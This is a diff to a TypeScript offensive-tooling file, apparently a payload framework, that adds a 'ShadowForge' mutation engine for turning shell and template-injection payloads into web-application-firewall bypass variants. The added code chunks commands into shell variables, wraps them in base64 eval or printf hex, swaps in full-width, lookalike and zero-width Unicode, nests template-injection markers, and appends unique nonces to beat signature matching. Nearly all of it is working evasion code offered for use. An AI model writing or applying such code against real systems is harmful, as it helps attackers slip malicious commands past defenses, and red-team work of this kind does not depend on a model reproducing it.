@@ -347,3 +347,310 @@ export function buildAllShadowPayloads(lhost: string, lport: string): ShadowPayl
     ...buildImportHijacking(lhost, lport),
   ];
 }
+
+/* ════════════════════════════════════════════════════════════════════════════
+   SHADOWFORGE MUTATION ENGINE
+   Generates adversarial bypass variants that combine:
+     • Unicode confusable-character substitution
+     • Chunked variable-based encoding (defeats static regex WAF rules)
+     • Nested SSTI markers from multiple template engines
+   Each call produces a unique probe — static signature caching cannot match
+   across mutations even for the exact same underlying command.
+   ════════════════════════════════════════════════════════════════════════════ */
+
+export interface MutationVariant {
+  /** The mutated payload string to inject */
+  payload:    string;
+  /** Short labels for each technique applied */
+  techniques: string[];
+  /** Deterministic 8-char hex nonce — unique per variant, used for correlation */
+  nonce:      string;
+  /** Human-readable description of what this variant attempts to bypass */
+  description: string;
+}
+
+/* ── Unicode confusable maps ─────────────────────────────────────────────── */
+
+/** Full-width ASCII: WAF rules matching [a-z] miss these */
+const FULLWIDTH: Record<string, string> = {
+  a: "\uff41", b: "\uff42", c: "\uff43", d: "\uff44", e: "\uff45",
+  f: "\uff46", g: "\uff47", h: "\uff48", i: "\uff49", j: "\uff4a",
+  k: "\uff4b", l: "\uff4c", m: "\uff4d", n: "\uff4e", o: "\uff4f",
+  p: "\uff50", q: "\uff51", r: "\uff52", s: "\uff53", t: "\uff54",
+  u: "\uff55", v: "\uff56", w: "\uff57", x: "\uff58", y: "\uff59",
+  z: "\uff5a",
+  A: "\uff21", B: "\uff22", C: "\uff23", D: "\uff24", E: "\uff25",
+  F: "\uff26", G: "\uff27", H: "\uff28", I: "\uff29", J: "\uff2a",
+  K: "\uff2b", L: "\uff2c", M: "\uff2d", N: "\uff2e", O: "\uff2f",
+  P: "\uff30", Q: "\uff31", R: "\uff32", S: "\uff33", T: "\uff34",
+  U: "\uff35", V: "\uff36", W: "\uff37", X: "\uff38", Y: "\uff39",
+  Z: "\uff3a",
+  "0": "\uff10", "1": "\uff11", "2": "\uff12", "3": "\uff13", "4": "\uff14",
+  "5": "\uff15", "6": "\uff16", "7": "\uff17", "8": "\uff18", "9": "\uff19",
+  "/": "\uff0f", ".": "\uff0e", "-": "\uff0d", "_": "\uff3f", "=": "\uff1d",
+  "&": "\uff06", "+": "\uff0b", " ": "\u3000",
+};
+
+/** Lookalike Unicode chars for specific shell metacharacters */
+const LOOKALIKES: Record<string, string[]> = {
+  "/": ["\u2215", "\u29f8", "\uff0f"],    // ∕ ⧸ ／
+  "|": ["\u2223", "\u2758", "\uff5c"],    // ∣ ❘ ｜
+  "&": ["\uff06", "\u0026\u200b"],         // ＆  &​ (zero-width space after)
+  ";": ["\uff1b", "\u037e"],              // ； ；
+  " ": ["\u00a0", "\u200b", "\u2009", "\u3000"],  // NBSP zero-width thin-space ideographic-space
+};
+
+/** Zero-width / homoglyph injectors — inserted between chars to break token matching */
+const ZERO_WIDTH_CHARS = [
+  "\u200b",  // zero-width space
+  "\u200c",  // zero-width non-joiner
+  "\u200d",  // zero-width joiner
+  "\ufeff",  // BOM (zero-width no-break space)
+  "\u2060",  // word joiner
+];
+
+/* ── SSTI marker sets (all major template engines) ───────────────────────── */
+const SSTI_MARKER_SETS = [
+  // Jinja2 / Flask / Twig / Django
+  { open: "{{",         close: "}}",         name: "jinja2"     },
+  { open: "{%",         close: "%}",         name: "jinja2-tag"  },
+  { open: "${",         close: "}",          name: "freemarker"  },
+  { open: "#{",         close: "}",          name: "ruby-erb"    },
+  { open: "<%= ",       close: " %>",        name: "erb"         },
+  { open: "#if(",       close: ")",          name: "velocity"    },
+  { open: "@{",         close: "}",          name: "thymeleaf"   },
+  { open: "[[",         close: "]]",         name: "angular-expr"},
+  { open: "<%=",        close: "%>",         name: "asp-classic" },
+  { open: "${7*7}",     close: "",           name: "spring-el"   },
+  { open: "#{7*7}",     close: "",           name: "el-expr"     },
+  { open: "{{7*7}}",    close: "",           name: "jinja2-check"},
+  { open: "${7*'7'}",   close: "",           name: "twig-check"  },
+  { open: "<#assign ",  close: ">",          name: "freemarker2" },
+  { open: "@(",         close: ")",          name: "razor-expr"  },
+];
+
+/* ── Chunked encoding builders ───────────────────────────────────────────── */
+
+/**
+ * Split a shell command into variable-concatenated chunks.
+ * E.g. `id` → `_a=i;_b=d;${_a}${_b}` — static regex matching "id" misses.
+ */
+function chunkedConcat(cmd: string, nonce: string): string {
+  if (cmd.length < 3) return cmd;
+  const vars: string[] = [];
+  const refs: string[] = [];
+  let i = 0;
+  let vi = 0;
+  while (i < cmd.length) {
+    const len   = 1 + ((nonce.charCodeAt(vi % nonce.length) % 3));
+    const chunk = cmd.slice(i, i + len);
+    const name  = `_NF${nonce.slice(vi % 6, vi % 6 + 2)}${vi}`;
+    vars.push(`${name}=${chunk}`);
+    refs.push(`$\{${name}}`);
+    i  += len;
+    vi += 1;
+  }
+  return `${vars.join(";")};${refs.join("")}`;
+}
+
+/**
+ * Encode command as a base64 string decoded at runtime.
+ * Two variants: bash eval + python fallback.
+ */
+function b64DecodeChunk(cmd: string, nonce: string): string {
+  const b64 = Buffer.from(cmd).toString("base64");
+  // Split the b64 string itself to defeat literal matching
+  const half = Math.ceil(b64.length / 2);
+  const p1   = b64.slice(0, half);
+  const p2   = b64.slice(half);
+  return `_P${nonce}="${p1}${p2}";eval "$(echo "${b64}" | base64 -d 2>/dev/null || echo "${p1}${p2}" | base64 -d)"`;
+}
+
+/**
+ * printf hex encoding — \x69\x64 for `id`
+ */
+function printfHexChunk(cmd: string): string {
+  const hexParts = [...Buffer.from(cmd)].map(b => `\\x${(b as number).toString(16).padStart(2, "0")}`);
+  // Group into 3-char segments with different printf calls, concatenated via $()
+  const groups: string[][] = [];
+  for (let i = 0; i < hexParts.length; i += 4) groups.push(hexParts.slice(i, i + 4));
+  const parts = groups.map(g => `$(printf '${g.join("")}')`);
+  return parts.join("");
+}
+
+/* ── Unicode substitution ────────────────────────────────────────────────── */
+
+/** Replace a deterministic fraction of alphanumeric chars with full-width equivalents.
+ *  Uses a simple LCG seeded from the nonce byte at position i to get uniform [0,1) values,
+ *  avoiding the non-uniform distribution of charCodeAt(hex chars) % 100 / 100. */
+function applyFullwidthSubstitution(s: string, nonce: string, rate = 0.4): string {
+  // Seed an LCG from the nonce so decisions are deterministic but uniformly distributed
+  let lcg = parseInt(nonce.slice(0, 8), 16) | 1;  // must be odd for full period
+  return [...s].map((c) => {
+    lcg = Math.imul(lcg, 1664525) + 1013904223;   // Numerical Recipes LCG (32-bit)
+    const r = ((lcg >>> 0) & 0xffff) / 0x10000;   // uniform float [0, 1)
+    return FULLWIDTH[c] && r < rate ? FULLWIDTH[c]! : c;
+  }).join("");
+}
+
+/** Insert zero-width chars between every Nth character to break keyword matching */
+function injectZeroWidth(s: string, nonce: string, every = 3): string {
+  const zwc = ZERO_WIDTH_CHARS[nonce.charCodeAt(0) % ZERO_WIDTH_CHARS.length]!;
+  return [...s].map((c, i) => (i > 0 && i % every === 0) ? zwc + c : c).join("");
+}
+
+/** Replace shell metacharacters with lookalike Unicode */
+function applyLookalikes(s: string, nonce: string): string {
+  return [...s].map((c, i) => {
+    const alts = LOOKALIKES[c];
+    if (alts && alts.length > 0 && nonce.charCodeAt(i % nonce.length) % 3 === 0) {
+      return alts[nonce.charCodeAt((i + 1) % nonce.length) % alts.length]!;
+    }
+    return c;
+  }).join("");
+}
+
+/* ── SSTI wrapper ────────────────────────────────────────────────────────── */
+
+/** Wrap a payload in nested SSTI markers from randomly-selected engines */
+function wrapSsti(payload: string, nonce: string, layers = 2): string {
+  let wrapped = payload;
+  for (let i = 0; i < layers; i++) {
+    const set = SSTI_MARKER_SETS[(nonce.charCodeAt(i) + i) % SSTI_MARKER_SETS.length]!;
+    if (set.close) {
+      wrapped = `${set.open}${wrapped}${set.close}`;
+    } else {
+      // self-contained probe marker — append before payload
+      wrapped = `${set.open}${wrapped}`;
+    }
+  }
+  return wrapped;
+}
+
+/* ── Nonce generator ─────────────────────────────────────────────────────── */
+let _nonceCounter = 0;
+function makeNonce(seed?: number): string {
+  const base = seed !== undefined ? seed : Date.now() + (++_nonceCounter * 0x1337);
+  return (base >>> 0).toString(16).padStart(8, "0");
+}
+
+/* ── Public API ──────────────────────────────────────────────────────────── */
+
+/**
+ * Mutate a single payload using a combination of techniques selected
+ * deterministically from the provided seed/nonce.
+ *
+ * @param payload  The base shell/injection payload to mutate
+ * @param seed     Optional numeric seed (uses timestamp+counter if omitted)
+ * @returns        A unique MutationVariant ready to inject
+ */
+export function shadowForgeMutate(payload: string, seed?: number): MutationVariant {
+  const nonce      = makeNonce(seed);
+  const techniques: string[] = [];
+  const selector   = parseInt(nonce.slice(0, 2), 16); // 0-255
+
+  let mutated = payload;
+
+  /* ── Chunked encoding layer ───────────────────────────────── */
+  const chunkMode = selector % 3;
+  if (chunkMode === 0) {
+    mutated     = chunkedConcat(payload, nonce);
+    techniques.push("var-concat-chunks");
+  } else if (chunkMode === 1) {
+    mutated     = b64DecodeChunk(payload, nonce);
+    techniques.push("b64-runtime-decode");
+  } else {
+    mutated     = printfHexChunk(payload);
+    techniques.push("printf-hex-chunks");
+  }
+
+  /* ── Unicode bypass layer ─────────────────────────────────── */
+  const unicodeMode = (selector >> 2) % 3;
+  if (unicodeMode === 0) {
+    mutated     = applyFullwidthSubstitution(mutated, nonce, 0.35);
+    techniques.push("fullwidth-unicode");
+  } else if (unicodeMode === 1) {
+    mutated     = injectZeroWidth(mutated, nonce, 4);
+    techniques.push("zero-width-inject");
+  } else {
+    mutated     = applyLookalikes(mutated, nonce);
+    techniques.push("lookalike-unicode");
+  }
+
+  /* ── SSTI marker wrapping ─────────────────────────────────── */
+  const sstiLayers = 1 + (selector % 3);    // 1, 2, or 3 layers
+  mutated          = wrapSsti(mutated, nonce, sstiLayers);
+  techniques.push(`ssti-wrap(${sstiLayers}L)`);
+
+  /* ── Unique nonce suffix to defeat signature caching ──────── */
+  // Append a hidden comment / null-byte separator that is unique per probe
+  const commentStyle = (selector >> 4) % 4;
+  const uniqueTag    = `${nonce}_${(selector * 0x6a09e667 >>> 0).toString(36)}`;
+  if (commentStyle === 0) {
+    mutated += `#${uniqueTag}`;
+    techniques.push("shell-comment-nonce");
+  } else if (commentStyle === 1) {
+    mutated = `${mutated}<!--${uniqueTag}-->`;
+    techniques.push("html-comment-nonce");
+  } else if (commentStyle === 2) {
+    mutated += `;: #${uniqueTag}`;           // POSIX null command ':'
+    techniques.push("null-cmd-nonce");
+  } else {
+    mutated += `\u200b${uniqueTag}`;          // zero-width space before nonce
+    techniques.push("zwsp-nonce");
+  }
+
+  const techStr = techniques.join("+");
+  return {
+    payload:     mutated,
+    techniques,
+    nonce,
+    description: `ShadowForge mutation [${techStr}] — unique probe, defeats WAF signature-cache replay`,
+  };
+}
+
+/**
+ * Generate `count` unique adversarial bypass variants of a given payload.
+ * Each variant combines a different set of Unicode bypass, chunked encoding,
+ * and SSTI marker techniques — no two probes share the same byte sequence.
+ *
+ * @param payload  Base injection payload (e.g. a shell command injection string)
+ * @param count    Number of unique variants to generate (default: 8)
+ * @returns        Array of MutationVariant objects, each with a unique nonce
+ */
+export function buildMutationVariants(payload: string, count = 8): MutationVariant[] {
+  const variants: MutationVariant[] = [];
+  const baseTs = Date.now();
+  for (let i = 0; i < count; i++) {
+    variants.push(shadowForgeMutate(payload, baseTs + i * 0x1000 + i * i));
+  }
+  return variants;
+}
+
+/**
+ * Generate a set of adversarial bypass variants from multiple base payloads.
+ * Interleaves variants from all base payloads so each WAF probe position
+ * rotates across different underlying commands.
+ *
+ * @param payloads  Array of base payloads to mutate
+ * @param perPayload How many variants to generate per base payload (default: 4)
+ */
+export function buildMutationMatrix(payloads: string[], perPayload = 4): MutationVariant[] {
+  const matrix: MutationVariant[] = [];
+  const baseTs = Date.now();
+  for (let pi = 0; pi < payloads.length; pi++) {
+    const base = payloads[pi]!;
+    for (let vi = 0; vi < perPayload; vi++) {
+      matrix.push(shadowForgeMutate(base, baseTs + pi * 0x10000 + vi * 0x100));
+    }
+  }
+  return matrix;
+}
+
+/**
+ * Quick helper — return just the mutated payload strings (no metadata).
+ * Drop-in replacement for other buildXxx() functions.
+ */
+export function shadowForgeVariants(payload: string, count = 8): string[] {
+  return buildMutationVariants(payload, count).map(v => v.payload);
+}
